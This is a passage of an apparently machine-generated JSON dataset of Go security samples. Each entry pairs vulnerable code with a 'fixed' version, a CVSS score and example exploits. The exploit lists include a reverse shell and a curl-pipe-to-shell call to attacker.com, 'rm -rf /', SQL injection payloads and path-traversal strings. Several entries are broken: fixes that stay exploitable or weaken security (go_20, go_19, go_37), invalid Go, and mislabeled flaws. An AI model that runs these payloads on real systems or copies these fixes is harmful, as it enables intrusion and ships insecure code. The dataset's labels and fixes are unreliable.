        "fixed_code": "package main\n\nimport (\n    \"fmt\"\n    \"golang.org/x/crypto/bcrypt\"\n)\n\ntype User struct {\n    Username string\n    PasswordHash []byte\n}\n\nvar users = map[string]User{\n    \"admin\": {Username: \"admin\", PasswordHash: []byte(\"$2a$10$vI8aWBnW3fID.ZQ4/zo1G.q1lRps.9cGLcZEiGDMVr5yUP1KUOYTa\")},\n}\n\nfunc authenticate(username, password string) bool {\n    user, exists := users[username]\n    if !exists {\n        return false\n    }\n    err := bcrypt.CompareHashAndPassword(user.PasswordHash, []byte(password))\n    return err == nil && len(password) >= 8\n}\n\nfunc main() {\n    fmt.Println(authenticate(\"admin\", \"correcthorsebatterystaple\"))\n}",
        "exploit_ways": [
            "An attacker can use a brute force attack to guess the password due to lack of rate limiting.",
            "If an attacker gains access to the source code, they can see the hashed password and attempt to crack it offline.",
            "No account lockout after multiple failed attempts allows for continuous guessing without consequence."
        ]
    },
    "go_15": {
        "vulnerability_type": "Command Injection",
        "vulnerability_code": "package main\n\ntype Executor struct {\n}\n\nfunc (e *Executor) RunCommand(cmd string) error {\n    return exec.Command(\"sh\", \"-c\", cmd).Run()\n}",
        "cvss_score": 8.2,
        "fixed_code": "package main\n\nimport (\n    \"os/exec\"\n)\ntype Executor struct {\n}\n\nfunc (e *Executor) RunCommand(cmd string, args []string) error {\n    return exec.Command(cmd, args...).Run()\n}",
        "exploit_ways": [
            "An attacker can input 'ls; rm -rf /' to delete all files.",
            "Could use 'bash -i >& /dev/tcp/attacker.com/80 0>&1' for a reverse shell.",
            "Executing commands like 'find / -name \".*\"' can reveal hidden files."
        ]
    },
    "go_16": {
        "vulnerability_type": "SQL Injection",
        "vulnerability_code": "package main\nimport (\n    \"database/sql\"\n    \"fmt\"\n    _ \"github.com/go-sql-driver/mysql\"\n)\ntype User struct {\n    ID   int\n    Name string\n}\nfunc (u *User) GetUserByName(name string) (*User, error) {\n    db, err := sql.Open(\"mysql\", \"user:password@tcp(127.0.0.1:3306)/dbname\")\n    if err != nil {\n        return nil, err\n    }\n    defer db.Close()\n    query := fmt.Sprintf(\"SELECT id, name FROM users WHERE name = '%s'\", name)\n    row := db.QueryRow(query)\n    err = row.Scan(&u.ID, &u.Name)\n    if err != nil {\n        return nil, err\n    }\n    return u, nil\n}\nfunc main() {}",
        "cvss_score": 8.2,
        "fixed_code": "package main\nimport (\n    \"database/sql\"\n    \"fmt\"\n    _ \"github.com/go-sql-driver/mysql\"\n)\ntype User struct {\n    ID   int\n    Name string\n}\nfunc (u *User) GetUserByName(name string) (*User, error) {\n    db, err := sql.Open(\"mysql\", \"user:password@tcp(127.0.0.1:3306)/dbname\")\n    if err != nil {\n        return nil, err\n    }\n    defer db.Close()\n    query := \"SELECT id, name FROM users WHERE name = ?\"\n    row := db.QueryRow(query, name)\n    err = row.Scan(&u.ID, &u.Name)\n    if err != nil {\n        return nil, err\n    }\n    return u, nil\n}\nfunc main() {}",
        "exploit_ways": [
            "An attacker can input \"admin' OR '1'='1\" to retrieve all user details.",
            "Using a payload like \"user_name'; DROP TABLE users; --\", the attackers could drop the entire users table.",
            "By inputting \"name' UNION SELECT password FROM admin_table -- \", an attacker might extract passwords from another table."
        ]
    },
    "go_17": {
        "vulnerability_type": "Privilege Escalation",
        "vulnerability_code": "package main\n\ntype User struct {\n    Name string\n    isAdmin bool\n}\n\nfunc (u *User) makeAdmin() {\n    if u.Name == \"admin\" {\n        u.isAdmin = true\n    }\n}",
        "cvss_score": 7.5,
        "fixed_code": "package main\n\ntype User struct {\n    Name string\n    isAdmin bool\n}\n\nfunc (u *User) makeAdmin() {\n    // Assuming only the system can set admin privileges, not based on user input.\n    // This is a mock function to demonstrate fixing privilege escalation.\n}",
        "exploit_ways": [
            "An attacker could exploit this by creating a user with the name 'admin' to gain administrative rights.",
            "If the application logic allows user registration or modification, an attacker can manipulate these processes to set isAdmin to true.",
            "By leveraging other vulnerabilities to call makeAdmin directly, an attacker could elevate their privileges."
        ]
    },
    "go_18": {
        "vulnerability_type": "Insecure Deserialization",
        "vulnerability_code": "package main\n\nimport (\n\t\"encoding/gob\"\n\t\"fmt\"\n\t\"os\"\n)\n\ntype User struct {\n\tName string\n\tAdmin bool\n}\n\nfunc main() {\n\tvar user User\n\tfile, _ := os.Open(\"user.gob\")\n\tdecoder := gob.NewDecoder(file)\n\tdecoder.Decode(&user)\n\tfmt.Printf(\"User: %+v\\n\", user)\n}",
        "cvss_score": 7.5,
        "fixed_code": "package main\n\nimport (\n\t\"encoding/gob\"\n\t\"fmt\"\n\t\"os\"\n\t\"log\"\n)\n\ntype User struct {\n\tName string\n\tAdmin bool\n}\n\nfunc main() {\n\tvar user User\n\tfile, err := os.Open(\"user.gob\")\n\tif err != nil {\n\t\tlog.Fatalf(\"Failed to open file: %s\", err)\n\t}\n\tdefer file.Close()\n\tdecoder := gob.NewDecoder(file)\n\tif err := decoder.Decode(&user); err != nil {\n\t\tlog.Fatalf(\"Failed to decode user: %s\", err)\n\t}\n\tfmt.Printf(\"User: %+v\\n\", user)\n}",
        "exploit_ways": [
            "An attacker can craft a malicious .gob file that executes arbitrary code when deserialized.",
            "By manipulating the serialized object, an attacker could escalate privileges by setting Admin to true.",
            "The vulnerability could be used to inject and execute payloads, leading to potential remote code execution."
        ]
    },
    "go_19": {
        "vulnerability_type": "Broken Authentication",
        "vulnerability_code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n)\n\ntype User struct {\n\tUsername string\n\tPassword string\n}\n\nvar users = []User{\n\t{Username: \"admin\", Password: \"password123\"},\n}\n\nfunc loginHandler(w http.ResponseWriter, r *http.Request) {\n\tr.ParseForm()\n\tusername := r.Form.Get(\"username\")\n\tpassword := r.Form.Get(\"password\")\n\n\tfor _, user := range users {\n\t\tif user.Username == username && user.Password == password {\n\t\t\tfmt.Fprintf(w, \"Login successful!\")\n\t\t\treturn\n\t\t}\n\t}\n\tfmt.Fprintf(w, \"Invalid credentials\")\n}\n\nfunc main() {\n\thttp.HandleFunc(\"/login\", loginHandler)\n\thttp.ListenAndServe(\":8080\", nil)\n}",
        "cvss_score": 6.5,
        "fixed_code": "package main\n\nimport (\n\t\"crypto/subtle\"\n\t\"encoding/base64\"\n\t\"fmt\"\n\t\"net/http\"\n)\n\ntype User struct {\n\tUsername string\n\tPasswordHash []byte\n}\n\nvar users = []User{\n\t{Username: \"admin\", PasswordHash: []byte(\"e3JhYjZwQDIkMDkudFVxM2RvNzNyT01tQ2IyUW5LckFnKzg=\"),}, // hash of 'password123'\n}\n\nfunc checkPassword(hash, password string) bool {\n\tdecodedHash, _ := base64.StdEncoding.DecodeString(hash)\n\tpasswordBytes := []byte(password)\n\treturn subtle.ConstantTimeCompare(decodedHash, passwordBytes) == 1\n}\n\nfunc loginHandler(w http.ResponseWriter, r *http.Request) {\n\tr.ParseForm()\n\tusername := r.Form.Get(\"username\")\n\tpassword := r.Form.Get(\"password\")\n\n\tfor _, user := range users {\n\t\tif user.Username == username && checkPassword(string(user.PasswordHash), password) {\n\t\t\tfmt.Fprintf(w, \"Login successful!\")\n\t\t\treturn\n\t\t}\n\t}\n\tfmt.Fprintf(w, \"Invalid credentials\")\n}\n\nfunc main() {\n\thttp.HandleFunc(\"/login\", loginHandler)\n\thttp.ListenAndServe(\":8080\", nil)\n}",
        "exploit_ways": [
            "An attacker could try common username and password combinations to brute-force access.",
            "Using a dictionary attack, the attacker can automate attempts to find valid credentials.",
            "If the server logs are not protected, an attacker could analyze them for patterns in failed login attempts."
        ]
    },
    "go_20": {
        "vulnerability_type": "Command Injection",
        "vulnerability_code": "package main\n\nimport (\n    \"fmt\"\n    \"os/exec\"\n)\n\nfunc executeCommand(command string) (string, error) {\n    cmd := exec.Command(\"sh\", \"-c\", command)\n    output, err := cmd.CombinedOutput()\n    if err != nil {\n        return string(output), err\n    }\n    return string(output), nil\n}",
        "cvss_score": 7.5,
        "fixed_code": "package main\n\nimport (\n    \"fmt\"\n    \"os/exec\"\n)\n\nfunc executeCommand(command string) (string, error) {\n    cmd := exec.Command(\"sh\", command)\n    output, err := cmd.CombinedOutput()\n    if err != nil {\n        return string(output), err\n    }\n    return string(output), nil\n}",
        "exploit_ways": [
            "An attacker can input 'ls && rm -rf /' to delete all files.",
            "They can use 'curl http://attacker.com/malware.sh | sh' to execute remote code.",
            "Input like 'echo \\\"Exploit successful\\\" > /tmp/exploit.txt' can create a file in the /tmp directory."
        ]
    },
    "go_21": {
        "vulnerability_type": "Buffer Overflow",
        "vulnerability_code": "package main\n\nimport (\n\t\"fmt\"\n)\n\nfunc vulnerableFunction(input []byte) {\n\tvar buffer [16]byte\n\tcopy(buffer[:], input)\n}\n\nfunc main() {\n\tuserInput := []byte(\"This is a long string that will cause a buffer overflow\")\n\tvulnerableFunction(userInput)\n}",
        "cvss_score": 7.5,
        "fixed_code": "package main\n\nimport (\n\t\"fmt\"\n)\n\nfunc safeFunction(input []byte) {\n\tvar buffer [16]byte\n\tif len(input) > len(buffer) {\n\t\tpanic(\"Input exceeds buffer size\")\n\t}\n\tcopy(buffer[:], input)\n}\n\nfunc main() {\n\tuserInput := []byte(\"This is a long string that will cause a buffer overflow\")\n\tsafeFunction(userInput)\n}",
        "exploit_ways": [
            "An attacker can provide an excessively long byte slice to overwrite adjacent memory and potentially execute arbitrary code.",
            "The overflow could be used to corrupt the program's stack, leading to unpredictable behavior or crashes.",
            "If the buffer is located in a sensitive part of memory, overwriting it might allow an attacker to inject shellcode for remote execution."
        ]
    },
    "go_22": {
        "vulnerability_type": "Buffer Overflow",
        "vulnerability_code": "package main\nimport (\n    \"fmt\"\n)\nfunc vulnerableFunction() {\n    buf := [16]byte{}\n    var input string\n    fmt.Scanln(&input)\n    copy(buf[:], []byte(input))\n}\nfunc main() {\n    vulnerableFunction()\n}",
        "cvss_score": 7.5,
        "fixed_code": "package main\nimport (\n    \"fmt\"\n)\nfunc safeFunction() {\n    var input [16]byte\n    fmt.Scanln(&input)\n}\nfunc main() {\n    safeFunction()\n}",
        "exploit_ways": [
            "An attacker could provide a string longer than 16 bytes to overwrite adjacent memory and potentially change program execution flow.",
            "By carefully crafting input, an attacker may be able to execute arbitrary code by overwriting the return address on the stack.",
            "The vulnerability can lead to a Denial of Service (DoS) condition where the application crashes due to invalid memory access."
        ]
    },
    "go_23": {
        "vulnerability_type": "Privilege Escalation",
        "vulnerability_code": "package main\n\nimport (\n    \"fmt\"\n    \"os/exec\"\n)\n\nfunc escalatePrivileges(command string) error {\n    cmd := exec.Command(\"sudo\", command)\n    return cmd.Run()\n}\n\nfunc main() {\n    var userCommand string\n    fmt.Print(\"Enter a command to run with elevated privileges: \")\n    fmt.Scanln(&userCommand)\n    if err := escalatePrivileges(userCommand); err != nil {\n        fmt.Println(err)\n    }\n}",
        "cvss_score": 8.8,
        "fixed_code": "package main\n\nimport (\n    \"fmt\"\n    \"os/exec\"\n)\n\nvar allowedCommands = map[string]bool{\n    \"apt-get\": true,\n    \"yum\":     true,\n}\n\nfunc escalatePrivileges(command string) error {\n    if _, ok := allowedCommands[command]; !ok {\n        return fmt.Errorf(\"command not allowed\")\n    }\n    cmd := exec.Command(\"sudo\", command)\n    return cmd.Run()\n}\n\nfunc main() {\n    var userCommand string\n    fmt.Print(\"Enter a command to run with elevated privileges: \")\n    fmt.Scanln(&userCommand)\n    if err := escalatePrivileges(userCommand); err != nil {\n        fmt.Println(err)\n    }\n}",
        "exploit_ways": [
            "User can input 'apt-get' followed by malicious parameters to install malware.",
            "Could use 'yum' with a crafted repository URL to execute arbitrary code.",
            "Entering 'bash' or other shell commands could provide an interactive shell with elevated privileges."
        ]
    },
    "go_24": {
        "vulnerability_type": "Cross-Site Request Forgery (CSRF)",
        "vulnerability_code": "package main\n\nimport (\n\t\\\"fmt\\\"\n\t\\\"net/http\\\"\n)\n\nfunc changeEmail(w http.ResponseWriter, r *http.Request) {\n\temail := r.FormValue(\\\"email\\\")\n\t// Update user email without CSRF protection\n\tfmt.Fprintf(w, \\\"Email changed to: %s\\\", email)\n}",
        "cvss_score": 7.5,
        "fixed_code": "package main\n\nimport (\n\t\\\"crypto/rand\\\"\n\t\\\"encoding/base64\\\"\n\t\\\"fmt\\\"\n\t\\\"net/http\\\"\n\t\\\"github.com/gorilla/csrf\\\"\n)\n\nvar csrfHandler = csrf.Protect(generateCSRFKey(),\n\tcsrf.Secure(false)) // Secure should be true in production\n\nfunc generateCSRFKey() []byte {\n\tkey := make([]byte, 32)\n\t_, err := rand.Read(key)\n\tif err != nil {\n\t\tpanic(err)\n\t}\n\treturn key\n}\n\nfunc changeEmail(w http.ResponseWriter, r *http.Request) {\n\temail := r.FormValue(\\\"email\\\")\n\t// Update user email with CSRF protection\n\tfmt.Fprintf(w, \\\"Email changed to: %s\\\", email)\n}",
        "exploit_ways": [
            "An attacker can create a malicious website that sends a request to change the victim's email.",
            "Using social engineering, an attacker can trick the user into clicking a link that changes their email without their knowledge.",
            "Crafting a CSRF token forgery attack if the protection is weak or improperly implemented."
        ]
    },
    "go_25": {
        "vulnerability_type": "Open Redirect",
        "vulnerability_code": "package main\n\nimport (\n    \"fmt\"\n    \"net/http\"\n    \"url\"\n)\n\nfunc redirectHandler(w http.ResponseWriter, r *http.Request) {\n    target := r.URL.Query().Get(\"url\")\n    parsedURL, err := url.Parse(target)\n    if err != nil {\n        fmt.Fprintf(w, \"Invalid URL\")\n        return\n    }\n    if parsedURL.Host == \"\" {\n        fmt.Fprintf(w, \"Missing host in URL\")\n        return\n    }\n    http.Redirect(w, r, target, http.StatusFound)\n}\n\nfunc main() {\n    http.HandleFunc(\"/redirect\", redirectHandler)\n    http.ListenAndServe(\":8080\", nil)\n}",
        "cvss_score": 6.5,
        "fixed_code": "package main\n\nimport (\n    \"fmt\"\n    \"net/http\"\n    \"url\"\n)\n\nfunc redirectHandler(w http.ResponseWriter, r *http.Request) {\n    allowedHosts := []string{\"example.com\", \"safe.example.org\"}\n    target := r.URL.Query().Get(\"url\")\n    parsedURL, err := url.Parse(target)\n    if err != nil || !isValidHost(parsedURL.Host, allowedHosts) {\n        fmt.Fprintf(w, \"Invalid or unauthorized URL\")\n        return\n    }\n    http.Redirect(w, r, target, http.StatusFound)\n}\n\nfunc isValidHost(host string, allowed []string) bool {\n    for _, a := range allowed {\n        if host == a {\n            return true\n        }\n    }\n    return false\n}\n\nfunc main() {\n    http.HandleFunc(\"/redirect\", redirectHandler)\n    http.ListenAndServe(\":8080\", nil)\n}",
        "exploit_ways": [
            "An attacker can craft a URL to redirect users to a malicious site like 'http://malicious.com'.",
            "By using URL encoding, an attacker might bypass basic validation checks and still perform open redirection.",
            "The vulnerability could be used in phishing attacks by directing users to fake login pages that mimic legitimate ones."
        ]
    },
    "go_26": {
        "vulnerability_type": "Missing Security Headers",
        "vulnerability_code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n)\n\nfunc handler(w http.ResponseWriter, r *http.Request) {\n\tw.Write([]byte(\"Hello, world!\"))\n}\n\nfunc main() {\n\thttp.HandleFunc(\"/\", handler)\n\thttp.ListenAndServe(\":8080\", nil)\n}",
        "cvss_score": 5.3,
        "fixed_code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n)\n\nfunc handler(w http.ResponseWriter, r *http.Request) {\n\tw.Header().Set(\"Content-Security-Policy\", \"default-src 'self'\")\n\tw.Header().Set(\"X-Content-Type-Options\", \"nosniff\")\n\tw.Header().Set(\"X-Frame-Options\", \"SAMEORIGIN\")\n\tw.Header().Set(\"X-XSS-Protection\", \"1; mode=block\")\n\tw.Write([]byte(\"Hello, world!\"))\n}\n\nfunc main() {\n\thttp.HandleFunc(\"/\", handler)\n\thttp.ListenAndServe(\":8080\", nil)\n}",
        "exploit_ways": [
            "Attackers can inject malicious scripts into the page if content security policies are not set.",
            "An attacker could perform clickjacking since X-Frame-Options is not configured properly.",
            "Without X-XSS-Protection, cross-site scripting (XSS) attacks may be more effective."
        ]
    },
    "go_27": {
        "vulnerability_type": "Clickjacking (Low Severity)",
        "vulnerability_code": "package main\n\ntype Clickjackable struct {\n    iframeURL string\n}\n\nfunc (c *Clickjackable) Render() string {\n    return \"<html><body><iframe src=\\\"\" + c.iframeURL + \"\\\"></iframe></body></html>\"\n}",
        "cvss_score": 2.6,
        "fixed_code": "package main\n\ntype Clickjackable struct {\n    iframeURL string\n}\n\nfunc (c *Clickjackable) Render() string {\n    return \"<html><head><style>body {display: none;}</style><meta http-equiv=\\\"X-Frame-Options\\\" content=\\\"DENY\\\"></head><body><iframe src=\\\"\" + c.iframeURL + \"\\\"></iframe></body></html>\"\n}",
        "exploit_ways": [
            "An attacker could host a malicious site that uses the vulnerable page in an iframe to trick users into clicking on it without their knowledge.",
            "By using the iframe, attackers can overlay the vulnerable page over another webpage making buttons or links appear to do something else.",
            "The vulnerability allows attackers to potentially steal user actions or information by mimicking trusted sites through framed content."
        ]
    },
    "go_28": {
        "vulnerability_type": "Clickjacking (Low Severity)",
        "vulnerability_code": "package main\n\nimport (\n    \"fmt\"\n    \"net/http\"\n)\n\nfunc handler(w http.ResponseWriter, r *http.Request) {\n    fmt.Fprintf(w, `<html>\n<head><title>Clickjacking Example</title></head>\n<body>\n<iframe src=\"https://example.com\" width=\"100%\" height=\"100%\"></iframe>\n</body>\n</html>`)\n}\n\nfunc main() {\n    http.HandleFunc(\"/\", handler)\n    http.ListenAndServe(\":8080\", nil)\n}",
        "cvss_score": 2.6,
        "fixed_code": "package main\n\nimport (\n    \"fmt\"\n    \"net/http\"\n)\n\nfunc handler(w http.ResponseWriter, r *http.Request) {\n    w.Header().Set(\"X-Frame-Options\", \"DENY\")\n    fmt.Fprintf(w, `<html>\n<head><title>Clickjacking Example</title></head>\n<body>\n<iframe src=\"https://example.com\" width=\"100%\" height=\"100%\"></iframe>\n</body>\n</html>`)\n}\n\nfunc main() {\n    http.HandleFunc(\"/\", handler)\n    http.ListenAndServe(\":8080\", nil)\n}",
        "exploit_ways": [
            "An attacker can embed the vulnerable page in an iframe on their malicious site to trick users into clicking without knowing.",
            "Users can be made to perform actions on the embedded frame, such as submitting forms or clicking buttons, by using overlaying transparent elements.",
            "Malicious sites could use the iframe to manipulate user interactions with the original site, potentially leading to data theft or unauthorized actions."
        ]
    },
    "go_29": {
        "vulnerability_type": "Denial-of-Service (DoS) - Low Impact",
        "vulnerability_code": "package main\n\nimport (\n    \"fmt\"\n    \"time\"\n)\n\nfunc slowFunction() {\n    for {\n        time.Sleep(1 * time.Second)\n        fmt.Println(\"Running...\")\n    }\n}",
        "cvss_score": 3.5,
        "fixed_code": "package main\n\nimport (\n    \"fmt\"\n    \"time\"\n)\n\nfunc slowFunction() {\n    for i := 0; i < 10; i++ { // Limit the number of iterations\n        time.Sleep(1 * time.Second)\n        fmt.Println(\"Running...\")\n    }\n}",
        "exploit_ways": [
            "An attacker can call slowFunction repeatedly, consuming system resources over time.",
            "If this function is part of a server process, repeated calls could prevent other requests from being handled promptly.",
            "By invoking the function in multiple goroutines, an attacker could significantly degrade performance."
        ]
    },
    "go_30": {
        "vulnerability_type": "HTTP Response Splitting",
        "vulnerability_code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n\t\"strings\"\n)\n\nfunc handler(w http.ResponseWriter, r *http.Request) {\n\tname := r.URL.Query().Get(\"name\")\n\tif strings.Contains(name, \"\\r\\n\") || strings.Contains(name, \"\\n\") {\n\t\tfmt.Fprintf(w, \"Invalid input\")\n\t\treturn\n\t}\n\tresponse := fmt.Sprintf(\"Hello, %s! Welcome to our website.\", name)\n\tw.Write([]byte(response))\n}\n\nfunc main() {\n\thttp.HandleFunc(\"/greet\", handler)\n\terr := http.ListenAndServe(\":8080\", nil)\n\tif err != nil {\n\t\tfmt.Println(err)\n\t}\n}",
        "cvss_score": 7.5,
        "fixed_code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n\t\"net/url\"\n)\n\nfunc handler(w http.ResponseWriter, r *http.Request) {\n\tname := r.URL.Query().Get(\"name\")\n\tsafeName := url.PathEscape(name)\n\tresponse := fmt.Sprintf(\"Hello, %s! Welcome to our website.\", safeName)\n\tw.Write([]byte(response))\n}\n\nfunc main() {\n\thttp.HandleFunc(\"/greet\", handler)\n\terr := http.ListenAndServe(\":8080\", nil)\n\tif err != nil {\n\t\tfmt.Println(err)\n\t}\n}",
        "exploit_ways": [
            "An attacker can input 'name=John%0D%0ASet-Cookie:%20malicious=true' to inject cookies.",
            "They could use 'name=John%0DRefresh:%200;url=http://attacker.com' for session hijacking.",
            "Input like 'name=John%0DContent-Length:%200%0D%0AHTTP/1.1%20200%20OK%0D%0AContent-Type:%20text/html%0D%0A%0D%0AMalicious%20content' can lead to false responses."
        ]
    },
    "go_31": {
        "vulnerability_type": "Denial-of-Service (DoS) - Low Impact",
        "vulnerability_code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n)\n\nfunc handler(w http.ResponseWriter, r *http.Request) {\n\tfor {\n\t}\n}\n\nfunc main() {\n\thttp.HandleFunc(\"/\", handler)\n\terr := http.ListenAndServe(\":8080\", nil)\n\tif err != nil {\n\t\tfmt.Println(err)\n\t}\n}",
        "cvss_score": 5.3,
        "fixed_code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n\t\"time\"\n)\n\nfunc handler(w http.ResponseWriter, r *http.Request) {\n\ttimeout := time.After(2 * time.Second)\n\tselect {\n\tcase <-timeout:\n\t\tw.WriteHeader(http.StatusRequestTimeout)\n\t\tw.Write([]byte(\"Request timed out\\n\"))\n\t}\n}\n\nfunc main() {\n\thttp.HandleFunc(\"/\", handler)\n\terr := http.ListenAndServe(\":8080\", nil)\n\tif err != nil {\n\t\tfmt.Println(err)\n\t}\n}",
        "exploit_ways": [
            "An attacker can send a request that keeps the server in an infinite loop, exhausting resources.",
            "By sending multiple requests simultaneously, the server could become unresponsive to legitimate traffic.",
            "The handler's infinite loop can lead to memory exhaustion as each request consumes system resources indefinitely."
        ]
    },
    "go_32": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "package main\n\nimport (\n    \"fmt\"\n    \"time\"\n)\n\nvar counter int = 0\n\nfunc increment() {\n    for i := 0; i < 1000; i++ {\n        counter++\n        time.Sleep(1 * time.Nanosecond)\n    }\n}\n\nfunc main() {\n    go increment()\n    go increment()\n    time.Sleep(2 * time.Millisecond)\n    fmt.Println(\"Final Counter Value:\", counter)\n}",
        "cvss_score": 5.3,
        "fixed_code": "package main\n\nimport (\n    \"fmt\"\n    \"sync\"\n    \"time\"\n)\n\nvar counter int = 0\nvar mutex sync.Mutex\n\nfunc increment() {\n    for i := 0; i < 1000; i++ {\n        mutex.Lock()\n        counter++\n        mutex.Unlock()\n        time.Sleep(1 * time.Nanosecond)\n    }\n}\n\nfunc main() {\n    go increment()\n    go increment()\n    time.Sleep(2 * time.Millisecond)\n    fmt.Println(\"Final Counter Value:\", counter)\n}",
        "exploit_ways": [
            "An attacker could force the program to run in a specific timing pattern, leading to incorrect increments.",
            "By carefully controlling the execution environment and process scheduling, an attacker might manipulate the final value of the counter.",
            "In a more complex application, this race condition could lead to inconsistent or corrupted state data."
        ]
    },
    "go_33": {
        "vulnerability_type": "HTTP Response Splitting",
        "vulnerability_code": "package main\n\nimport (\n    \"fmt\"\n    \"net/http\"\n    \"strings\"\n)\n\ntype User struct {\n    Name string\n}\n\nfunc (u *User) Greet(w http.ResponseWriter, r *http.Request) {\n    name := r.URL.Query().Get(\"name\")\n    greeting := fmt.Sprintf(\"Hello, %s! Welcome to our site.\", name)\n    w.Write([]byte(greeting))\n}\n\nfunc main() {\n    user := &User{}\n    http.HandleFunc(\"/greet\", user.Greet)\n    http.ListenAndServe(\":8080\", nil)\n}",
        "cvss_score": 5.3,
        "fixed_code": "package main\n\nimport (\n    \"fmt\"\n    \"net/http\"\n    \"net/url\"\n    \"strings\"\n)\n\ntype User struct {\n    Name string\n}\n\nfunc (u *User) Greet(w http.ResponseWriter, r *http.Request) {\n    name := r.URL.Query().Get(\"name\")\n    encodedName := url.PathEscape(name)\n    greeting := fmt.Sprintf(\"Hello, %s! Welcome to our site.\", encodedName)\n    w.Write([]byte(greeting))\n}\n\nfunc main() {\n    user := &User{}\n    http.HandleFunc(\"/greet\", user.Greet)\n    http.ListenAndServe(\":8080\", nil)\n}",
        "exploit_ways": [
            "An attacker can inject \\r\\n to split the HTTP response, leading to header injection.",
            "They could use \\r\\nSet-Cookie: evilCookie=maliciousValue; Path=/ to set a malicious cookie.",
            "Injecting \\r\\nHTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\n<html><body>Malicious Content</body></html> could lead to display of arbitrary HTML content."
        ]
    },
    "go_34": {
        "vulnerability_type": "Race Condition (Difficult to Exploit)",
        "vulnerability_code": "package main\n\nimport (\n\t\"fmt\"\n\t\"time\"\n)\n\nglobalCounter int = 0\n\nfunc increment() {\n\tlocalCounter := globalCounter\n\ttime.Sleep(time.Millisecond)\n\tlocalCounter++\n\tglobalCounter = localCounter\n}\n\nfunc main() {\n\tfor i := 0; i < 1000; i++ {\n\t\tgo increment()\n\t}\n\ttime.Sleep(time.Second)\n\tfmt.Println(\"Final counter value:\", globalCounter)\n}",
        "cvss_score": 6.2,
        "fixed_code": "package main\n\nimport (\n\t\"fmt\"\n\t\"sync\"\n\t\"time\"\n)\n\nglobalCounter int = 0\nvar mu sync.Mutex\n\nfunc increment() {\n\tmu.Lock()\n\tdefer mu.Unlock()\n\tglobalCounter++\n}\n\nfunc main() {\n\tfor i := 0; i < 1000; i++ {\n\t\tgo increment()\n\t}\n\ttime.Sleep(time.Second)\n\tfmt.Println(\"Final counter value:\", globalCounter)\n}",
        "exploit_ways": [
            "An attacker could cause the counter to be incremented incorrectly, leading to data inconsistency.",
            "By timing attacks, an attacker might manipulate the state of shared variables leading to unexpected behavior in the application.",
            "If the code is part of a larger system, incorrect increments can propagate errors and affect other parts of the application."
        ]
    },
    "go_35": {
        "vulnerability_type": "Missing Security Headers",
        "vulnerability_code": "package main\n\nimport (\n    \"net/http\"\n)\n\nfunc handler(w http.ResponseWriter, r *http.Request) {\n    w.Write([]byte(\"Hello, world!\"))\n}\n\nfunc main() {\n    http.HandleFunc(\"/\", handler)\n    http.ListenAndServe(\":8080\", nil)\n}",
        "cvss_score": 2.7,
        "fixed_code": "package main\n\nimport (\n    \"net/http\"\n)\n\nfunc handler(w http.ResponseWriter, r *http.Request) {\n    w.Header().Set(\"Content-Security-Policy\", \"default-src 'self'\")\n    w.Header().Set(\"X-Frame-Options\", \"SAMEORIGIN\")\n    w.Header().Set(\"X-XSS-Protection\", \"1; mode=block\")\n    w.Header().Set(\"X-Content-Type-Options\", \"nosniff\")\n    w.Write([]byte(\"Hello, world!\"))\n}\n\nfunc main() {\n    http.HandleFunc(\"/\", handler)\n    http.ListenAndServe(\":8080\", nil)\n}",
        "exploit_ways": [
            "An attacker could perform Clickjacking attacks since X-Frame-Options is not set.",
            "Reflected XSS may be possible if user input is improperly handled and included in the response without sanitization.",
            "Content security policy (CSP) is missing, allowing potentially malicious scripts to be loaded."
        ]
    },
    "go_36": {
        "vulnerability_type": "Local File Inclusion (LFI) - Limited Scope",
        "vulnerability_code": "package main\n\nimport (\n    \"fmt\"\n    \"os\"\n)\n\ntype FileReader struct {\n    filePath string\n}\n\nfunc (fr *FileReader) ReadFile() string {\n    data, _ := os.ReadFile(fr.filePath)\n    return string(data)\n}\n\nfunc main() {\n    var userPath string\n    fmt.Print(\"Enter file path: \")\n    fmt.Scan(&userPath)\n    reader := FileReader{filePath: userPath}\n    content := reader.ReadFile()\n    fmt.Println(content)\n}",
        "cvss_score": 4.5,
        "fixed_code": "package main\n\nimport (\n    \"fmt\"\n    \"os\"\n    \"path/filepath\"\n    \"strings\"\n)\n\ntype FileReader struct {\n    filePath string\n}\n\nfunc (fr *FileReader) ReadFile() (string, error) {\n    data, err := os.ReadFile(fr.filePath)\n    if err != nil {\n        return \"\", err\n    }\n    return string(data), nil\n}\n\nfunc main() {\n    var userPath string\n    fmt.Print(\"Enter file path: \")\n    fmt.Scan(&userPath)\n    baseDir := \"/safe/directory\"\n    absPath, err := filepath.Abs(userPath)\n    if err != nil {\n        fmt.Println(\"Invalid path\")\n        return\n    }\n    if !strings.HasPrefix(absPath, baseDir) {\n        fmt.Println(\"Access denied\")\n        return\n    }\n    reader := FileReader{filePath: absPath}\n    content, err := reader.ReadFile()\n    if err != nil {\n        fmt.Println(\"Error reading file:\", err)\n        return\n    }\n    fmt.Println(content)\n}",
        "exploit_ways": [
            "An attacker could enter a path like '../../etc/passwd' to read sensitive system files.",
            "By entering '..\\..\\windows\\system32\\drivers\\etc\\hosts' on Windows, an attacker can access the hosts file.",
            "Supplying a crafted path with null bytes or special characters might bypass some simple checks in the application."
        ]
    },
    "go_37": {
        "vulnerability_type": "Clickjacking (Low Severity)",
        "vulnerability_code": "package main\nimport \"net/http\"\nfunc vulnerableHandler(w http.ResponseWriter, r *http.Request) {\n    w.Header().Set(\"X-Frame-Options\", \"DENY\")\n    if r.URL.Path == \"/clickjack\" {\n        w.Write([]byte(`<iframe src=\"https://example.com\"></iframe>`))\n    }\n}",
        "cvss_score": 3.5,
        "fixed_code": "package main\nimport \"net/http\"\nfunc secureHandler(w http.ResponseWriter, r *http.Request) {\n    w.Header().Set(\"X-Frame-Options\", \"SAMEORIGIN\")\n    if r.URL.Path == \"/clickjack\" {\n        w.Write([]byte(`<iframe src=\"https://example.com\"></iframe>`))\n    }\n}",
        "exploit_ways": [
            "An attacker can host a malicious site that frames the vulnerable page to trick users into clicking on unintended elements.",
